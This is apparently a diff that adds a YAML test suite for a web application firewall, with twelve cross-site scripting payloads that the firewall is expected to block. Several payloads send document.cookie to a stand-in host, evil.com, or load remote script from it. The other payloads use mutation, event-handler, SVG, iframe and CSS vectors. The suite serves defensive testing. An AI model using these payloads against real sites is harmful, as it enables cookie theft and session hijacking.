@@ -1,0 +1,150 @@
+meta:
+  category: "Cross-Site Scripting"
+  subcategory: "Additional Vectors"
+  owasp: "A03:2021, WSTG-CLNT-01"
+  severity: "high"
+
+tests:
+  - id: "xss-add-001"
+    title: "Mutation XSS via noscript tag"
+    tags: ["xss", "mutation", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-002"
+    title: "XSS via fetch() exfiltration"
+    tags: ["xss", "exfiltration", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/comments"
+      headers:
+        Content-Type: "application/json"
+      body: '{"body":"<script>fetch(\"https://evil.com/steal?cookie=\"+document.cookie)</script>"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-003"
+    title: "XSS via XMLHttpRequest"
+    tags: ["xss", "exfiltration", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/comments"
+      headers:
+        Content-Type: "application/json"
+      body: '{"body":"<script>var x=new XMLHttpRequest();x.open(\"GET\",\"https://evil.com/\"+document.cookie);x.send();</script>"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-004"
+    title: "XSS via CSS expression (IE legacy)"
+    tags: ["xss", "css", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/profile"
+      headers:
+        Content-Type: "application/json"
+      body: '{"bio":"<div style=\"width:expression(alert(document.cookie))\">"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-005"
+    title: "XSS via meta refresh redirect"
+    tags: ["xss", "meta", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-006"
+    title: "XSS via base tag hijack"
+    tags: ["xss", "base-tag", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/posts"
+      headers:
+        Content-Type: "application/json"
+      body: '{"content":"<base href=\"https://evil.com/\"><script src=\"payload.js\"></script>"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-007"
+    title: "XSS via srcdoc attribute"
+    tags: ["xss", "iframe", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<iframe srcdoc=\"<script>alert(parent.document.cookie)</script>\"></iframe>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-008"
+    title: "XSS via form action javascript"
+    tags: ["xss", "form", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/comments"
+      headers:
+        Content-Type: "application/json"
+      body: '{"body":"<form action=\"javascript:alert(1)\"><input type=submit value=Click></form>"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-009"
+    title: "XSS via onbeforeinput event"
+    tags: ["xss", "event-handler", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<div contenteditable onbeforeinput=alert(1)>type here</div>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-010"
+    title: "XSS via animation event handlers"
+    tags: ["xss", "event-handler", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationstart=alert(1)></div>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-011"
+    title: "XSS via SVG foreignObject"
+    tags: ["xss", "svg", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/posts"
+      headers:
+        Content-Type: "application/json"
+      body: '{"content":"<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-add-012"
+    title: "XSS via import() dynamic import"
+    tags: ["xss", "module", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<script>import('https://evil.com/xss.js').then(m=>m.default())</script>"
+    expected:
+      status: 403
+      action: "block"
